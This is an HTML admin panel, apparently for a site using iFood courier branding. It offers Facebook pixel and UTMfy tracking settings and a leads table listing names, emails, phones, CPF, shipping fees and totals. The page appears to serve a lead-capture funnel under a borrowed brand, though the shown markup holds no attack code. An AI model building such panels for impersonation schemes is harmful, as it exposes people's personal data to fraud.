<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <meta name="theme-color" content="#EA1D2C" />
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C" />
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="default" />
  <title>iFood Entregadores - Admin</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="style.css?v=3.0" />
</head>
<body data-page="admin">
  <header class="header">
    <div class="logo-container">
      <img src="assets/ifoodentregadores.webp" alt="iFood Entregador" class="ifood-logo ifood-logo--wide" />
    </div>
  </header>

  <main class="container">
    <section class="step admin-card" aria-hidden="false">
      <h1>Painel Administrativo</h1>
      <p class="admin-muted">Gerencie o pixel, eventos de rastreamento e visualize leads.</p>

      <div id="admin-login" class="admin-login">
        <h2>Acesso restrito</h2>
        <div class="input-group">
          <input type="password" id="admin-password" class="floating-input" placeholder=" " autocomplete="current-password" />
          <label for="admin-password" class="floating-label">Senha do admin</label>
        </div>
        <button id="admin-login-btn" class="btn-primary" type="button">Entrar</button>
        <div id="admin-login-error" class="form-error hidden"></div>
      </div>

      <div id="admin-panel" class="admin-panel hidden">
        <div class="admin-section">
          <div class="admin-section-header">
            <h2>Pixel do Facebook</h2>
            <span class="admin-chip">Rastreamento</span>
          </div>
          <div class="admin-grid">
            <label class="admin-switch">
              <input type="checkbox" id="pixel-enabled" />
              <span>Pixel ativo</span>
            </label>
            <div class="input-group">
              <input type="text" id="pixel-id" class="floating-input" placeholder=" " />
              <label for="pixel-id" class="floating-label">Pixel ID</label>
            </div>
            <div class="admin-checkboxes">
              <label><input type="checkbox" id="pixel-event-page" /> PageView</label>
              <label><input type="checkbox" id="pixel-event-lead" /> Lead</label>
              <label><input type="checkbox" id="pixel-event-purchase" /> Purchase</label>
            </div>
          </div>
        </div>

        <div class="admin-section">
          <div class="admin-section-header">
            <h2>UTMfy (opcional)</h2>
            <span class="admin-chip">Webhooks</span>
          </div>
          <div class="admin-grid">
            <label class="admin-switch">
              <input type="checkbox" id="utmfy-enabled" />
              <span>Enviar eventos</span>
            </label>
            <div class="input-group">
              <input type="text" id="utmfy-endpoint" class="floating-input" placeholder=" " />
              <label for="utmfy-endpoint" class="floating-label">Endpoint UTMfy</label>
            </div>
            <div class="input-group">
              <input type="password" id="utmfy-api" class="floating-input" placeholder=" " />
              <label for="utmfy-api" class="floating-label">Token (opcional)</label>
            </div>
          </div>
        </div>

        <div class="admin-actions">
          <button id="admin-save" class="btn-primary" type="button">Salvar configuracoes</button>
          <span id="admin-save-status" class="admin-muted"></span>
        </div>

        <div class="admin-section">
          <div class="admin-section-header">
            <h2>Leads</h2>
            <span id="leads-count" class="admin-chip">0</span>
          </div>
          <div class="admin-toolbar">
            <input type="text" id="leads-search" placeholder="Buscar por nome, email, telefone ou CPF" />
            <button id="leads-refresh" class="btn-secondary" type="button">Atualizar</button>
          </div>
          <div class="admin-table-wrap">
            <table class="admin-table">
              <thead>
                <tr>
                  <th>Nome</th>
                  <th>Email</th>
                  <th>Telefone</th>
                  <th>Etapa</th>
                  <th>Status</th>
                  <th>Frete</th>
                  <th>Total</th>
                  <th>Atualizado</th>
                </tr>
              </thead>
              <tbody id="leads-body"></tbody>
            </table>
          </div>
          <button id="leads-more" class="btn-secondary" type="button">Carregar mais</button>
        </div>
      </div>
    </section>
  </main>

  <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>

  <footer class="footer">
    <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
  </footer>

  <script src="script.js" defer></script>
</body>
</html>
